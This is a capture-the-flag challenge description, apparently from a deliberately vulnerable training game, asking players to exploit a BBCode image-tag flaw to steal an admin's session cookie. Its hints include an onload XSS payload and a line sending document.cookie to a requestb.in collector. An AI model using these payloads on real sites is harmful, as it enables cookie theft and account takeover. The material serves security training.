# XSS/CSRF Challenge 2

----------------------

Hey friend,

I recently added profile signatures to user profiles (due to popular demand from my users). These signatures can be set under the Preferences page, and support BBCode.

I had a user recently complain to me that his account got hacked. Apparently the hacker found something in my BBCode parser he was able to exploit to do an XSS attack and steal this user's cookie, then login as him.

Can you see if you can duplicate that attack? My admin account (through the magic of phantomjs) will be logged in and visiting all user profiles in the game every 10 minutes. If you are able to capture my cookie and login as me, I'll eat my hat.

Thanks!

-Breakthenet Game Owner

----------------------

Stuck? 
----------------------
<details> 
  <summary>Click for hint 1</summary>
   BBCode allows you to embed an image like so: [img]http://url.com/image.jpg[/img]
   
   Play around with that.
</details>

<details> 
  <summary>Click for hint 2</summary>
   Try breaking the BBCode image tag by inserting other characters (besides the url) inside of it. Use chrome inspector or view-source on "My Profile" to see what your BBCode input looks like when it's translated into html.
</details>

<details> 
  <summary>Click for hint 3</summary>
   http://requestb.in/ is a neat site for testing webhooks. Cookie stealing is kind of like a webhook. If you were somehow able to get javascript execution, you could potentially change the SRC of the image to something like this:
   
   http://requestb.in/1fj9x6o1?c='+document.cookie
   
   And then review the cookie (passed as a GET parameter) on requestb.in!
</details>

<details> 
  <summary>Click for hint 4</summary>
   Did you know you can execute javascript when an image loads? It's simple! All you have to do is use the onLoad attribute, like so:
   
   &lt;img src="logo.png" onload="alert(1)"&gt
</details>





